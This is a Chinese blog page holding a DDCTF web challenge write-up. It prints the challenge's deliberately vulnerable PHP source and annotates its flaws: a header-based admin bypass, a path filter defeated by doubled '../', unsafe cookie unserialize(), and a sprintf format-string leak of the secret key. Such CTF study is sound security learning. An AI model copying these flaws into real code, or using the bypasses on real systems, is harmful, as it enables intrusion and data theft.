<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-48x48-next.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Web," />










<meta name="description" content="前言DDCTF比赛的时候很自闭，那么复现的就要好好做了:) 滴~众所周知这是一道脑洞题，没有什么意思。 Web签到题这道题大佬们都写得非常简单，之前比赛时因为没有审计php代码的经验，拿到源码后很懵，痛定思痛，对源码仔细审计了一番。 获取源码打开页面，提示没有登陆权限。 然后抓包，在第二个包中发现访问了&#x2F;app&#x2F;Auth.php，并且有一个didictf_username字段为空，我们加上admi">
<meta property="og:type" content="article">
<meta property="og:title" content="DDCTF Web Writeup">
<meta property="og:url" content="https://www.sketchplane.top/2019/07/06/DDCTF-Web%E9%83%A8%E5%88%86/index.html">
<meta property="og:site_name" content="sketch_pl4ne">
<meta property="og:description" content="前言DDCTF比赛的时候很自闭，那么复现的就要好好做了:) 滴~众所周知这是一道脑洞题，没有什么意思。 Web签到题这道题大佬们都写得非常简单，之前比赛时因为没有审计php代码的经验，拿到源码后很懵，痛定思痛，对源码仔细审计了一番。 获取源码打开页面，提示没有登陆权限。 然后抓包，在第二个包中发现访问了&#x2F;app&#x2F;Auth.php，并且有一个didictf_username字段为空，我们加上admi">
<meta property="og:image" content="https://i.loli.net/2019/07/07/5d20e39850cde68876.png">
<meta property="og:image" content="https://i.loli.net/2019/07/07/5d20e3c1ce9d880929.png">
<meta property="og:image" content="https://i.loli.net/2019/07/09/5d24758d445e158993.png">
<meta property="og:image" content="https://i.loli.net/2019/07/09/5d24758d2ecde12075.png">
<meta property="og:image" content="https://i.loli.net/2019/07/09/5d24758d45b8099324.png">
<meta property="og:image" content="https://i.loli.net/2019/07/09/5d24758d1c93e27172.png">
<meta property="og:image" content="https://i.loli.net/2019/07/09/5d24758d1c86157114.png">
<meta property="og:image" content="https://i.loli.net/2019/07/10/5d2605232983656770.png">
<meta property="og:image" content="https://i.loli.net/2019/07/11/5d260fe1ace2c70074.png">
<meta property="og:image" content="https://i.loli.net/2019/07/11/5d261087158a983187.png">
<meta property="og:image" content="https://i.loli.net/2019/07/11/5d26155c0202658527.png">
<meta property="og:image" content="https://i.loli.net/2019/07/11/5d2616954110f60879.png">
<meta property="og:image" content="https://i.loli.net/2019/07/11/5d2617323c0f143580.png">
<meta property="article:published_time" content="2019-07-06T14:11:14.000Z">
<meta property="article:modified_time" content="2019-07-10T17:10:14.352Z">
<meta property="article:author" content="sketch_pl4ne">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2019/07/07/5d20e39850cde68876.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://www.sketchplane.top/2019/07/06/DDCTF-Web部分/"/>





  <title>DDCTF Web Writeup | sketch_pl4ne</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?efbba552aa6e43dbec35569bd35c0ef6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="sketch_pl4ne" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">sketch_pl4ne</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://www.sketchplane.top/2019/07/06/DDCTF-Web%E9%83%A8%E5%88%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sketch_pl4ne">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sketch_pl4ne">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">DDCTF Web Writeup</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-06T22:11:14+08:00">
                2019-07-06
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  5.9k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  27
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DDCTF比赛的时候很自闭，那么复现的就要好好做了:)</p>
<h2 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h2><p>众所周知这是一道脑洞题，没有什么意思。</p>
<h2 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h2><p>这道题大佬们都写得非常简单，之前比赛时因为没有审计php代码的经验，拿到源码后很懵，痛定思痛，对源码仔细审计了一番。</p>
<h3 id="获取源码"><a href="#获取源码" class="headerlink" title="获取源码"></a>获取源码</h3><p>打开页面，提示没有登陆权限。</p>
<p>然后抓包，在第二个包中发现访问了<code>/app/Auth.php</code>，并且有一个<code>didictf_username</code>字段为空，我们加上admin去访问，获得回显：</p>
<p><img src="https://i.loli.net/2019/07/07/5d20e39850cde68876.png" alt="1.png"></p>
<p>解码一下得到hint：<code>{&quot;errMsg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&quot;}</code></p>
<p>然后访问对应页面，就得到了两个php文件的源码。</p>
<h3 id="审计源码"><a href="#审计源码" class="headerlink" title="审计源码"></a>审计源码</h3><p>Application.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $path = <span class="string">''</span>; <span class="comment">//该变量可以实现文件读取</span></span><br><span class="line"> </span><br><span class="line">	<span class="comment">//response() 回显$data 以及 $errMsg</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Enter response()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"echo:&#123;&lt;br&gt;data: $data&lt;br&gt;errMsg: $errMsg&lt;br&gt;&#125;&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//auth() 对header头里的didictf_username字段进行验证</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Enter auth()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">		$DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">		$_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] = $DIDICTF_ADMIN;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>, <span class="string">'error'</span>);</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//sanitizepath()  对$path参数进行过滤</span></span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123; </span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Enter sanitizepath()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">		$path = trim($path); <span class="comment">//首尾去空</span></span><br><span class="line">		$path = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $path); <span class="comment">// 双写绕过</span></span><br><span class="line">		$path = str_replace(<span class="string">'..\\'</span>, <span class="string">''</span>, $path); <span class="comment">//注意$path长度只能是18</span></span><br><span class="line">		<span class="keyword">return</span> $path; <span class="comment">//返回$path</span></span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//析构函数 ==》 控制$path可以输出flag</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Enter __destruct()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;<span class="comment">//$path不为空</span></span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path); <span class="comment">// 不为空就调用sanitizepath()做替换</span></span><br><span class="line">			<span class="keyword">if</span> (strlen($path) !== <span class="number">18</span>) &#123; <span class="comment">//如果处理过的$path长度不严格等于18，就跳出</span></span><br><span class="line">				<span class="keyword">exit</span>();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;response($data = file_get_contents($path) , <span class="string">'Congratulations'</span>); </span><br><span class="line">            <span class="comment">//读出$path路径下的文件，并且用response()回显</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Session.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>; <span class="comment">// 包含Application类</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123; <span class="comment">//定义Session继承Application类</span></span><br><span class="line"> </span><br><span class="line">	<span class="comment">//key建议为8位字符串</span></span><br><span class="line">	<span class="keyword">var</span> $eancrykey = <span class="string">''</span>;<span class="comment">//储存位于../config/key.txt的密钥</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//一些关于cookie的变量</span></span><br><span class="line">	<span class="keyword">var</span> $cookie_expiration = <span class="number">7200</span>;</span><br><span class="line">	<span class="keyword">var</span> $cookie_name = <span class="string">'ddctf_id'</span>;</span><br><span class="line">	<span class="keyword">var</span> $cookie_path = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">var</span> $cookie_domain = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">var</span> $cookie_secure = <span class="keyword">FALSE</span>;</span><br><span class="line">	<span class="keyword">var</span> $activity = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	<span class="comment">//index()</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Enter index()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">parent</span>::auth()) &#123; <span class="comment">//调用auth(),需要didictf_username=admin才能继续执行</span></span><br><span class="line">		</span><br><span class="line">			<span class="keyword">$this</span>-&gt;get_key(); <span class="comment">//调用get_key()</span></span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;session_read()) &#123; <span class="comment">//调用session_read()，为真继续执行</span></span><br><span class="line">				$data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">				$data = sprintf($data, $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">				<span class="keyword">parent</span>::response($data, <span class="string">'sucess'</span>); <span class="comment">//打印 DiDI Welcome you + UA</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;session_create(); <span class="comment">//如果session_read()返回为FLASE，就调用session_create()</span></span><br><span class="line">				$data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">				<span class="keyword">parent</span>::response($data, <span class="string">'sucess'</span>); <span class="comment">//只打印DiDI Welcome you</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//get_key() 获取位于../config/key.txt的key值</span></span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Enter get_key()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">		<span class="comment">//eancrykey  and flag under the folder ..</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;eancrykey = file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"eancrykey = $this-&gt;eancrykey"</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//session_read() //验证session的函数</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Enter Session_read()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE)) &#123;<span class="comment">//Cookie不为空</span></span><br><span class="line">			<span class="keyword">print</span> <span class="string">'NO Cookies'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Have Cookies'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"> </span><br><span class="line">		$session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];<span class="comment">//$session = Cookie里ddctf_id的内容</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"session: $session"</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">isset</span>($session)) &#123; <span class="comment">// 如果cookie中的ddctf_id没设置，就返回FALSE</span></span><br><span class="line">			<span class="keyword">parent</span>::response(<span class="string">"session not found"</span>, <span class="string">'error'</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		$hash = substr($session, strlen($session) - <span class="number">32</span>); <span class="comment">//$hash = $session的后32位</span></span><br><span class="line">		$session = substr($session, <span class="number">0</span>, strlen($session) - <span class="number">32</span>); <span class="comment">//去除$session的后32位校验</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"hash: $hash&lt;br&gt;session: $session"</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"> </span><br><span class="line">		<span class="keyword">if</span> ($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey . $session)) &#123;</span><br><span class="line">			<span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>, <span class="string">'error'</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">		&#125; <span class="comment">//如果后32位不等于 md5(密钥 + 去除最后32位校验后ddctf_id的内容)，返回False</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">		$session = unserialize($session); <span class="comment">//**反序列化** $path变量控制点</span></span><br><span class="line">		print_r($session);</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"> 		</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">if</span> (!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>])) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">		&#125; <span class="comment">//如果$session反序列化后不是数组、$session['session_id']不存在、session['ip_address']不存在、session['user_agent']不存在，就返回FLASE</span></span><br><span class="line"> </span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123; <span class="comment">//POST nickname参数</span></span><br><span class="line">			$arr = <span class="keyword">array</span>(</span><br><span class="line">				$_POST[<span class="string">"nickname"</span>],</span><br><span class="line">				<span class="keyword">$this</span>-&gt;eancrykey</span><br><span class="line">			);</span><br><span class="line">			$data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">			<span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;<span class="comment">//将数组arr的每一个键名存入$k,键值存入$v</span></span><br><span class="line">				$data = sprintf($data, $v);<span class="comment">//蜜汁操作，存在sprintf格式化注入</span></span><br><span class="line">                						   <span class="comment">//post nickname=%s 获取key.txt内容</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">parent</span>::response($data, <span class="string">"Welcome"</span>);</span><br><span class="line">		&#125; </span><br><span class="line"> </span><br><span class="line">		<span class="keyword">if</span> ($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">			<span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span> . <span class="string">'error'</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">		&#125; <span class="comment">//你session的ip_address和真实ip相等才能继续执行</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">		<span class="keyword">if</span> ($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">			<span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>, <span class="string">'error'</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">		&#125; <span class="comment">//session的ua和真实ua相等才能继续</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	<span class="comment">//session_create()  设置Cookie **ddctf_id的内容是经过序列化的**</span></span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123; <span class="comment">//创建session</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Enter session_create()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">		$sessionid = <span class="string">''</span>;</span><br><span class="line"> </span><br><span class="line">		<span class="keyword">while</span> (strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">			$sessionid.= mt_rand(<span class="number">0</span>, mt_getrandmax());</span><br><span class="line">		&#125; <span class="comment">//$sessinoid是随机的32位数字</span></span><br><span class="line"> </span><br><span class="line">		$userdata = <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid, <span class="keyword">TRUE</span>)) ,</span><br><span class="line">			<span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">			<span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">			<span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">		);</span><br><span class="line">		<span class="comment">//基于你真实的ip和ua设置一个数组$userdata</span></span><br><span class="line"> </span><br><span class="line">		$cookiedata = serialize($userdata); <span class="comment">//把$userdata数组序列化后赋值给$cookiedata</span></span><br><span class="line">		$cookiedata = $cookiedata . md5(<span class="keyword">$this</span>-&gt;eancrykey . $cookiedata); <span class="comment">//然后在$userdata前面加上eancrykey后md5加密赋值给$cookiedata</span></span><br><span class="line">		$expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time(); <span class="comment">//7200加上当前时间戳赋值给$expire</span></span><br><span class="line">		setcookie(<span class="keyword">$this</span>-&gt;cookie_name, $cookiedata, $expire, <span class="keyword">$this</span>-&gt;cookie_path, <span class="keyword">$this</span>-&gt;cookie_domain, <span class="keyword">$this</span>-&gt;cookie_secure);</span><br><span class="line">		<span class="comment">//设置cookie： cookie_name,cookiedata,expire</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index(); <span class="comment">//开始</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



